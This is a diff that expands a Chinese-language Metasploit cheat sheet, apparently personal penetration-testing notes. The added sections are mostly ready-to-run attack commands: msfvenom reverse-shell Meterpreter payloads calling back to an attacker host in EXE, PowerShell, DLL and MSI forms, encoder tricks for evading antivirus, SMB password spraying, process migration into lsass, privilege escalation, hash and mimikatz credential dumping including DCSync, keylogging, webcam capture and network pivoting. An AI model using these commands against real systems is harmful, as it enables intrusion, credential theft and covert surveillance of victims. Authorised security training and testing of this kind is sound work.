@@ -8,6 +8,43 @@
 
 使用 MSF 套件中的 `msfvenom` 生成载荷。
 
+### Windows 载荷生成（最常用）
+
+- `-p`：选择 payload
+- `LHOST`：我方接收主机 IP
+- `LPORT`：我方接收监听端口
+- `-f`：输出格式
+- `-o`：载荷输出位置
+
+生成 x64 反弹 Meterpreter 的 EXE：
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -o shell.exe
+```
+
+其他常用格式：
+
+- `-f psh-cmd`：PowerShell 一句话命令，可直接粘贴到目标 cmd 执行，适合不落盘场景
+- `-f dll`：DLL 载荷，用于 DLL 劫持或 `rundll32` 加载
+- `-f msi`：MSI 安装包，配合 `msiexec /q /i shell.msi` 执行
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f psh-cmd
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f dll -o shell.dll
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f msi -o shell.msi
+```
+
+加编码迭代（改变载荷静态特征）：
+
+```
+# x86 载荷用 shikata_ga_nai 多态编码，-i 指定迭代次数
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o shell.exe
+# x64 载荷需换用 x64 编码器（如 x64/xor_dynamic）
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -e x64/xor_dynamic -i 5 -o shell.exe
+```
+
+> 注意：`shikata_ga_nai` 等经典编码器对现代 AV 效果有限，编码只能改变静态特征、无法消除行为特征，实战免杀需结合加密载荷、加壳或自研加载器。
+
 ### Meterpreter of Python
 
 - `-p`：选择 payload
@@ -90,6 +127,16 @@ msf6 exploit(multi/handler) > run
 meterpreter >
 ```
 
+### 常用辅助模块
+
+| 模块路径 | 用途 |
+| --- | --- |
+| auxiliary/scanner/portscan/tcp | 内网 TCP 端口扫描 |
+| auxiliary/scanner/discovery/arp_scanner | ARP 方式发现内网存活主机 |
+| auxiliary/scanner/smb/smb_login | SMB 口令爆破（本地/域账号密码喷洒） |
+| exploit/windows/smb/psexec_psh | PowerShell 版 PsExec，凭据/Hash 直接拿会话 |
+| post/windows/gather/credentials/* | 各类应用凭证收集（浏览器、WiFi、Outlook 等） |
+
 ## 0x04 Meterpreter 常用命令
 
 ### 基本命令
@@ -106,6 +153,8 @@ getpid   # 获取当前进程ID(PID)
 sysinfo   # 查看目标机系统信息
 irb   # 开启ruby终端
 ps   # 查看正在运行的进程    
+route  # 查看目标机路由表
+arp    # 查看目标机 ARP 缓存
 kill <PID值> # 杀死指定PID进程
 idletime     # 查看目标机闲置时间
 reboot / shutdown    # 重启/关机
@@ -148,6 +197,65 @@ run autoroute -s 192.168.183.0/24  # 添加目标网段路由
 run autoroute -p  # 查看添加的路由
 ```
 
+### 进程迁移与权限提升
+
+```
+ps                # 查看进程列表，选定稳定且合法的进程
+migrate <pid>     # 进程迁移：注入到合法进程（如 explorer.exe / lsass.exe），规避排查、防止原载体进程退出掉线
+getsystem         # 尝试提权到 SYSTEM（自动尝试多种技术）
+```
+
+### 凭证获取
+
+```
+hashdump        # 导出本地 SAM 库中所有用户的 NTLM Hash
+creds_all       # 一键汇总：SAM Hash + 内存明文 + 密码历史等
+load kiwi       # 加载 mimikatz 插件（老版本为 load mimikatz），详见下节速查
+```
+
+### Mimikatz（kiwi）模块速查
+
+`load kiwi` 加载 mimikatz 插件后可用：
+
+```
+creds_msv            # 抓取 MSV 凭证（NTLM Hash）
+creds_wdigest        # 抓取 WDigest 凭证（需目标开启 WDigest 才有明文）
+creds_kerberos       # 抓取 Kerberos 明文密码/票据
+lsa_dump_sam         # 导出本地 SAM 库 Hash
+lsa_dump_secrets     # 导出 LSA Secrets
+dcsync_ntlm <user>   # DCSync：从域控直接同步指定用户的 NTLM Hash（需域管权限）
+```
+
+### 键盘记录与屏幕监控
+
+```
+keyscan_start    # 开始键盘记录
+keyscan_dump     # 导出已记录的键盘输入
+keyscan_stop     # 停止键盘记录
+screenshot       # 屏幕截图（自动保存到本地目录）
+webcam_snap      # 摄像头拍照
+webcam_stream    # 开启摄像头视频流
+```
+
+### 网络代理与内网穿透
+
+与上文「端口转发」「添加路由」两节配合使用，典型流程：查网段 → 加路由 → 端口转发/代理：
+
+```
+run get_local_subnets                   # 查看目标内网网段
+run autoroute -s 10.0.0.0/24            # 添加目标网段路由
+portfwd add -l 3389 -r 10.0.0.5 -p 3389 # 将内网目标 3389 转发到本地 3389
+```
+
+如需让 msf 之外的工具（浏览器、nmap 等）走目标内网，可在 `msfconsole` 中启用 socks 代理：
+
+```
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+run
+```
+
 ## 0x05 注意事项
 
 - 先确认 payload 类型、监听模式和目标连接方式一致，否则 handler 很容易配错。
@@ -156,3 +264,5 @@ run autoroute -p  # 查看添加的路由
 
 ## Ref
 - https://xz.aliyun.com/t/6400
+- https://docs.metasploit.com/ （MSF 官方文档）
+- https://www.offsec.com/metasploit-unleashed/ （Metasploit Unleashed 免费在线教程）
